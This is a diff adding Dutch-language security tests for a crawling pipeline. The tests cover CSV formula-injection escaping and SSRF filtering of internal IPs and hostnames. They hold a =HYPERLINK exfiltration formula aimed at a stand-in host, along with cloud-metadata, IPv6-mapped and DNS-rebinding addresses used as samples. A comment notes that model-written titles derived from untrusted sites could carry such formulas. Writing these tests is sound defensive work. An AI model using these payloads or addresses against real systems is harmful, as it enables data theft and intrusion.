@@ -39,7 +39,8 @@ import { compare, deltaOf, thresholdOf, verdictOf, minQuestionsForSignal } from 
 import { buildChangeBlock, isWorthEmailing } from "@/lib/pipeline/period-change-format";
 import type { PeriodChange } from "@/lib/pipeline/period-change-format";
 import { domainOf } from "@/lib/offsite/domain";
-import { checkUrlFormat } from "@/lib/url";
+import { checkUrlFormat, isInternalHostname, isInternalIp } from "@/lib/url";
+import { csvCell } from "@/lib/csv";
 import { sanitizeForPostgres, hasUnstorableChars } from "@/lib/pg-text";
 import { countOpenPeriodicMeasurements } from "@/lib/jobs/pending";
 import { formatEvidenceDossier, excerpt } from "@/lib/pipeline/evidence-format";
@@ -952,6 +953,116 @@ group("webadres controleren", () => {
   ok("leeg wordt geweigerd", !checkUrlFormat("").ok);
   ok("spaties worden geweigerd", !checkUrlFormat("voor beeld.nl").ok);
   ok("e-mailadres wordt geweigerd", !checkUrlFormat("jan@voorbeeld.nl").ok);
+});
+
+/**
+ * ⚠️ Deze groep bewaakt de kritieke bevinding uit antihack.md (K1). Elk adres
+ * hieronder kwam op 29 augustus 2026 door `checkUrlFormat` heen, en de pijplijn
+ * haalde het vervolgens op en toonde de inhoud terug in het merkdossier.
+ *
+ * Gaat hier ooit een test rood, verwijder hem dan NIET: dan is de zeef stuk.
+ */
+group("CSV-cellen zijn veilig voor Excel (antihack.md M4)", () => {
+  // Formule-injectie. De titel van een contentstuk komt uit het model, dat
+  // schrijft op basis van tekst van een website die wij niet beheren. Een
+  // geprepareerde site kan zo een formule in de export van de klant krijgen.
+  ok("gelijkteken wordt onschadelijk", csvCell("=1+1") === "'=1+1");
+  ok("plus wordt onschadelijk", csvCell("+1") === "'+1");
+  ok("min wordt onschadelijk", csvCell("-1") === "'-1");
+  ok("apenstaartje wordt onschadelijk", csvCell("@SUM(A1)") === "'@SUM(A1)");
+  ok("tab wordt onschadelijk", csvCell("\tiets") === "'\tiets");
+  ok(
+    "een HYPERLINK die data wegstuurt wordt tekst",
+    csvCell('=HYPERLINK("http://kwaad/?d="&A1,"klik")').includes("'="),
+  );
+
+  // Het aanhalen zelf moet blijven werken zoals het werkte.
+  ok("gewone tekst blijft ongemoeid", csvCell("Fietsen in Utrecht") === "Fietsen in Utrecht");
+  ok("puntkomma wordt aangehaald", csvCell("a;b") === '"a;b"');
+  ok("aanhalingsteken wordt verdubbeld", csvCell('zeg "hoi"') === '"zeg ""hoi"""');
+  ok("regeleinde wordt aangehaald", csvCell("regel1\nregel2") === '"regel1\nregel2"');
+  ok("null wordt leeg", csvCell(null) === "");
+  ok("een getal blijft een getal", csvCell(42) === "42");
+
+  // ⚠️ Een negatief getal is een echte waarde, maar Excel ziet er een formule
+  // in. Onschadelijk maken wint: een apostrof in een cel is een schoonheidsfout,
+  // een uitgevoerde cel is een lek. Alle getalkolommen in de export zijn
+  // tellingen en verschillen, en die zijn nooit negatief behalve een daling.
+  ok("negatief getal krijgt de apostrof", csvCell(-3) === "'-3");
+});
+
+group("interne IP-adressen na het opzoeken (antihack.md K1, stap A1)", () => {
+  const intern = [
+    "169.254.169.254", "10.0.0.55", "127.0.0.1", "192.168.1.10",
+    "172.16.0.1", "172.31.255.254", "100.64.0.1", "0.0.0.0",
+    "198.18.0.1", "224.0.0.1", "192.0.0.1",
+    "::1", "::", "fd00::1", "fc00::abcd", "fe80::1",
+    // ⚠️ Een IPv4-adres vermomd als IPv6. Zonder het uitpakken hiervan glipt
+    // elk privé adres er in deze vorm gewoon langs.
+    "::ffff:10.0.0.1", "::ffff:127.0.0.1",
+  ];
+  for (const ip of intern) ok(`weert ${ip}`, isInternalIp(ip));
+
+  const publiek = [
+    "8.8.8.8", "1.1.1.1", "193.176.0.1", "172.32.0.1", "172.15.0.1",
+    // ⚠️ Publieke IPv6 moet WEL door. isInternalHostname weigert elk
+    // IPv6-adres, want niemand typt zijn website zo in. Hier mag dat niet:
+    // een doodgewone website kan een AAAA-record hebben, en die weigeren zou
+    // betekenen dat we hem niet meer kunnen crawlen.
+    "2001:4860:4860::8888", "2a00:1450:4001:800::200e",
+    "::ffff:8.8.8.8",
+  ];
+  for (const ip of publiek) ok(`laat ${ip} door`, !isInternalIp(ip));
+
+  ok("rommel telt als intern", isInternalIp("niet-een-adres"));
+  ok("leeg telt als intern", isInternalIp(""));
+  ok("een deel boven 255 telt als intern", isInternalIp("999.1.1.1"));
+});
+
+group("interne adressen worden geweerd (antihack.md K1)", () => {
+  const intern = [
+    "169.254.169.254", // metadata-adres van de cloud
+    "10.0.0.55",
+    "10.0.0.5",
+    "192.168.1.10",
+    "172.17.0.12", // Docker
+    "172.31.255.1",
+    "100.64.0.10", // carrier grade NAT
+    "127.0.0.1",
+    "0.0.0.0",
+    "198.18.0.1", // testnetwerk
+    "224.0.0.1", // multicast
+    "localhost",
+    "db.internal",
+    "kassa.local",
+    "::1",
+    "fd00::1",
+  ];
+  for (const host of intern) {
+    ok(`weert ${host}`, isInternalHostname(host));
+    ok(`formaatcontrole weert ${host}`, !checkUrlFormat(host).ok);
+  }
+
+  // ⚠️ De tegenproef telt net zo zwaar. Een zeef die alles weert is geen zeef,
+  // en 172.32 en 172.15 vallen NET buiten het privé-bereik 172.16 tot 172.31.
+  const publiek = [
+    "outerorbit.nl",
+    "mediamarkt.nl",
+    "sub.domein.co.uk",
+    "voorbeeld-met-streepje.nl",
+    "8.8.8.8",
+    "172.32.0.1",
+    "172.15.0.1",
+    "193.176.0.1",
+  ];
+  for (const host of publiek) {
+    ok(`laat ${host} door`, !isInternalHostname(host));
+  }
+
+  // ⚠️ Dit adres komt hier bewust WEL doorheen, en dat is geen fout maar de
+  // grens van een pure functie: het is een geldige publieke naam die pas bij het
+  // opzoeken naar 127.0.0.1 blijkt te wijzen. Die vangt lib/safe-fetch.ts.
+  ok("een publieke naam die naar binnen wijst komt hier langs", !isInternalHostname("127.0.0.1.nip.io"));
 });
 
 // ════════════════════════════════════════════════════════════════════════════
